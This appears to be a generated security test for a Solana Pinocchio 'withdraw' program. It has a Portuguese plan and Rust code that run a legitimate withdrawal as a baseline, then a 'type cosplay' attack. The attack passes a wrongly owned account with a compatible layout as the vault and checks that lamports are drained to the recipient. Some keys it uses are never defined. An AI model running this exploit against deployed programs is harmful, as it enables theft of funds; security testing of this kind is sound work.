{
  "plan": "O programa `withdraw` (Pinocchio) le o vault como um buffer cru: authority em [8..40] e balance em [40..48], sem verificar discriminador de tipo. O baseline usa um vault legitimo (dono = program_id, layout correto) e uma authority que assina, provando que o cenario esta montado. O ataque passa uma conta de OUTRO tipo logico (dono diferente, ex.: uma conta de configuracao com layout compativel) no slot do vault, mantendo a mesma authority e recipient. O efeito medido e que os lamports da conta cosplayada sao debitados e creditados ao recipient, demonstrando que o programa aceitou um tipo diferente como vault.",
  "scenario": "let program_id = env.program_id;

// Authority legitima (signer) e recipient
let authority = Pubkey::new_unique();
let recipient = Pubkey::new_unique();

// ---- Vault legitimo: dono = program_id, layout [disc(8)][authority(32)][balance(8)] ----
let mut vault_data = vec![0u8; 48];
vault_data[8..40].copy_from_slice(authority.as_ref());
vault_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());
let vault_legit = account(&program_id, &vault_data, Some(2_000_000));

let authority_acc = wallet(1_000_000);
let recipient_acc = wallet(1_000_000);

// ---- Baseline: withdraw legitimo ----
let amount: u64 = 100_000;
let mut ix_data = vec![0u8]; // IX_WITHDRAW
ix_data.extend_from_slice(&amount.to_le_bytes());

let ix_legit = env.raw_ix(
    &ix_data,
    &[
        AccountMeta::new(vault_legit_key, false),
        AccountMeta::new_readonly(authority, true),
        AccountMeta::new(recipient, false),
    ],
);

let baseline_accounts = [
    (vault_legit_key, vault_legit.clone()),
    (authority, authority_acc.clone()),
    (recipient, recipient_acc.clone()),
];

let r_base = env.baseline("withdraw legitimo", &ix_legit, &baseline_accounts);

// ---- Ataque COSPLAY: conta de OUTRO tipo no slot do vault ----
// Conta de outro tipo logico (dono diferente), mas com layout de bytes compativel:
// [8 bytes de discriminador de OUTRO tipo][authority(32)][balance(8)]
let other_owner = Pubkey::new_unique();
let mut cosplay_data = vec![0u8; 48];
// discriminador de outro tipo (diferente do vault legitimo)
cosplay_data[0..8].copy_from_slice(&[0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x11, 0x22]);
cosplay_data[8..40].copy_from_slice(authority.as_ref());
cosplay_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());
let cosplay_vault = account(&other_owner, &cosplay_data, Some(2_000_000));

let ix_attack = env.raw_ix(
    &ix_data,
    &[
        AccountMeta::new(cosplay_vault_key, false),
        AccountMeta::new_readonly(authority, true),
        AccountMeta::new(recipient, false),
    ],
);

let attack_accounts = [
    (cosplay_vault_key, cosplay_vault.clone()),
    (authority, authority_acc.clone()),
    (recipient, recipient_acc.clone()),
];

let r = env.attack("cosplay: conta de outro tipo aceita como vault", &ix_attack, &attack_accounts);

if r.program_result == ProgramResult::Success {
    // Dano: os lamports da conta cosplayada foram debitados e o recipient creditado
    let cosplay_after = after(&r, &cosplay_vault_key);
    let recipient_after = after(&r, &recipient);
    env.effect(
        "lamports da conta cosplayada debitados (vault de outro tipo aceito)",
        cosplay_after.lamports() == 2_000_000 - amount,
    );
    env.effect(
        "recipient creditado com lamports da conta cosplayada",
        recipient_after.lamports() == 1_000_000 + amount,
    );
}
"
}

